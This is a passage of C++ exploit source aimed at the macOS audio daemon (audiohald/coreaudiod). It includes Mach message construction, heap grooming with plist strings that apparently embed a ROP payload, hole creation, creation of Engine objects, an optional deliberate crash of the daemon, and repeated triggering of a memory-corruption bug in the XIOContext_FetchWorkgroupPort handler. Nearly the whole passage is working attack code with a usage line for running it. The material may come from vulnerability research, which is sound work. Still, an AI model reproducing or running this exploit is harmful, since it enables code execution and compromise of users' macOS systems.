    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010034;

    msg->object_id = created_devices.back();
    created_devices.pop_back();
    msg->mSelector = 'acom';
    msg->mScope = 'glob';
    msg->mElement = 0;
    msg->plist_length = strlen(data) + 1;

    mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    
    delete msg;
    free(data);

    if (result != MACH_MSG_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    return 0;
}

/*
 * Triggers the vulnerability by sending message ID 1010059 (XIOContext_FetchWorkgroupPort).
 *
 * This message handler contains a memory corruption bug. When called on an Engine
 * object that has been set up through heap grooming, it may:
 *   - Dereference a dangling pointer
 *   - Access corrupted object data
 *   - Execute the ROP chain placed in heap memory
 *
 * The object_id parameter specifies which Engine object to target.
 */
void trigger_vulnerability(uint32_t object_id) {
    xiocontext_fetch_workgroup_port_mach_message *msg = new xiocontext_fetch_workgroup_port_mach_message;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = sizeof(xiocontext_fetch_workgroup_port_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010059;  // XIOContext_FetchWorkgroupPort - THE VULNERABLE HANDLER

    msg->object_id = object_id;

    kern_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xiocontext_fetch_workgroup_port_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error in mach_msg send and receive: %s\n" RESET, mach_error_string(result));
        delete msg;
        return;
    }

    delete msg;
}

/*
 * Enumerates all Engine objects and randomly selects one to exploit.
 *
 * Engine objects have type "ngnejboa" (reversed: "aobjenng" = "EngineObject").
 * Scanning object IDs 0x20-200 covers the typical range where these land.
 * A random selection adds unpredictability to exploitation attempts.
 */
uint32_t getRandomEngineObject() {
    uint32_t matches[1000];
    size_t count = 0;

    // Scan for Engine objects in the typical ID range
    for (uint32_t i = 0x20; i < 200; i++) {
        char *object_type = getObjectType(i);

        if (object_type) {
            if (!strcmp(object_type, "ngnejboa")) {  // "ngnejboa" = Engine object
                printf(GREEN " -> Found ENGN object at ID %d\n" RESET, i);
                matches[count++] = i;
            }
            free(object_type);
        }
    }

    if (count == 0) {
        printf(RED "‚ùå ENGN object not found, something is wrong...\n" RESET);
        exit(1);
    }

    // arc4random_uniform() - <stdlib.h> (macOS) - cryptographically secure random
    // Randomly select one of the found Engine objects
    uint32_t chosen = matches[arc4random_uniform(count)];
    printf(MAGENTA "üéØ Random ENGN object chosen to try to exploit: %d\n" RESET, chosen);
    return chosen;
}

/*
 * Initializes connection to audiohald.
 *
 * 1. Gets the bootstrap port from the kernel
 * 2. Looks up the audiohald service by name
 * 3. Sends XSystem_Open to register as a client
 */
void initialize() {
    // task_get_bootstrap_port() - <mach/mach.h>
    // Gets the bootstrap port which is used to look up system services
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to get bootstrap port, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got Bootstrap port! %d\n" RESET, bootstrap_port);

    // bootstrap_look_up() - <servers/bootstrap.h>
    // Looks up a Mach service by name, returns a send right to its port
    // This is how we get a connection to audiohald
    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS) {
        printf(RED "‚ùå bootstrap lookup failed, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got service port! %d\n" RESET, service_port);
    printf(BLUE "üëâ Initializing client...\n" RESET);
    sendInitializeClientMessage();
}

/*
 * getopt.h - Command-line argument parsing
 * Provides:
 *   - getopt_long()     : Parse long-form command line options (--flag)
 *   - struct option     : Long option definition structure
 *   - optarg            : Global pointer to current option's argument
 *   - required_argument : Option requires an argument
 *   - no_argument       : Option takes no argument
 */
#include <getopt.h>

/*
 * Prints command-line usage information.
 */
void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [options]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --iterations <n>    Number of grooming iterations (default: 0)\n");
    fprintf(stderr, "  --allocs <n>        Allocations per iteration (default: 0)\n");
    fprintf(stderr, "  --frees <n>         Number of objects to free (default: 0)\n");
    fprintf(stderr, "  --objects <n>       Number of engine objects to create (default: 0)\n");
    fprintf(stderr, "  --pre-crash         Trigger a crash before main exploit attempts (default: false)\n");
    fprintf(stderr, "  --attempts <n>      Number of exploit attempts (default: 0)\n");
    fprintf(stderr, "  --help              Show this help message\n");
}

/*
 * Main entry point - orchestrates the exploitation phases.
 *
 * Usage: ./exploit [options]
 *   --iterations <n>  Number of heap spray iterations
 *   --allocs <n>      Allocations per iteration (payload copies in each plist)
 *   --frees <n>       Number of allocations to free (creates heap holes)
 *   --objects <n>     Number of Engine objects to create
 *   --pre-crash       Crash audiohald first to reset state
 *   --attempts <n>    Number of exploit trigger attempts
 *
 * Typical exploitation flow:
 *   ./exploit --iterations 100 --allocs 50 --frees 20 --objects 5 --attempts 10
 */
int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);  // Disable stdout buffering for real-time output

    // Exploitation parameters (set via command line)
    uint32_t num_frees = 0;           // How many allocations to free
    uint32_t num_engine_objects = 0;  // How many vulnerable objects to create
    uint32_t trigger_pre_crash = 0;   // Whether to crash audiohald first
    uint32_t num_attempts = 0;        // How many times to trigger the bug

    static struct option long_options[] = {
        {"iterations", required_argument, 0, 'i'},
        {"allocs",     required_argument, 0, 'a'},
        {"frees",      required_argument, 0, 'f'},
        {"objects",    required_argument, 0, 'o'},
        {"pre-crash",  no_argument,       0, 'c'},
        {"attempts",   required_argument, 0, 't'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "i:a:f:o:ct:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i': num_iterations = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'a': allocs_per_iteration = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'f': num_frees = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'o': num_engine_objects = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'c': trigger_pre_crash = 1; break;
            case 't': num_attempts = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }

    // Connect to audiohald and register as a client
    initialize();

    /*
     * PHASE 1: HEAP GROOMING
     * Fill the heap with controlled data (ROP payload embedded in plist strings).
     * This establishes a predictable heap layout.
     */
    if (num_iterations > 0) {
        printf(BLUE "\n--- HEAP GROOMING PHASE ---\n" RESET);
        printf("Performing %d iterations of %d allocations\n", num_iterations, allocs_per_iteration);
        sleep(2);
        doAllocations(num_iterations);
    }

    /*
     * PHASE 2: HOLE CREATION
     * Free some allocations to create gaps in the heap.
     * Subsequent allocations (Engine objects) may land in these freed regions.
     */
    if (num_frees > 0) {
        printf(BLUE "\n--- FREEING PHASE ---\n" RESET);
        if (num_frees > created_devices.size()) {
            num_frees = created_devices.size();
        }
        for (uint32_t i = 0; i < num_frees; i++) {
            printf("üï≥Ô∏è  Freeing allocation %d...\n", i + 1);
            freeAllocation();
        }
    }

    /*
     * PHASE 3: VULNERABLE OBJECT CREATION
     * Create Engine/Tap objects that contain the vulnerable code path.
     * These may land in the freed heap regions containing our ROP payload.
     */
    if (num_engine_objects > 0) {
        printf(BLUE "\n--- VULNERABLE OBJECT CREATION ---\n" RESET);
        createEngineObjects(num_engine_objects);
    }

    /*
     * OPTIONAL: PRE-CRASH
     * Crash audiohald to reset its state. When it respawns, existing
     * Engine objects from other processes may be in a different state.
     */
    if (trigger_pre_crash) {
        printf(MAGENTA "\nüí£ Triggering a crash so we can load new ENGN objects...\n" RESET);
        trigger_vulnerability(0x1);  // Invalid object ID causes crash
        printf(YELLOW "‚è≥ Triggered crash, waiting for coreaudiod to respawn...\n" RESET);
        sleep(5);
        initialize();  // Reconnect after respawn
    }

    /*
     * PHASE 4: EXPLOITATION ATTEMPTS
     * Repeatedly trigger the vulnerability on random Engine objects.
     * If heap grooming was successful, one of these triggers will
     * execute our ROP chain.
     */
    if (num_attempts > 0) {
        printf(BLUE "\n--- EXPLOIT ATTEMPT PHASE ---\n" RESET);
        for (uint32_t i = 0; i < num_attempts; i++) {
            printf(CYAN "\nüîé Attempt %d of %d: Enumerating ENGN objects in the Audio HAL...\n" RESET, i + 1, num_attempts);
            uint32_t engn_id = getRandomEngineObject();
            printf(MAGENTA "üí• Triggering vulnerability on it...\n" RESET);
            trigger_vulnerability(engn_id);
            printf(YELLOW "üò¥ Sleeping for 5 seconds...\n" RESET);
            sleep(5);  // Wait for potential crash/exploit effect
        }
    }

    printf(GREEN "\nüéâ All stages complete.\n" RESET);
    return 0;
}
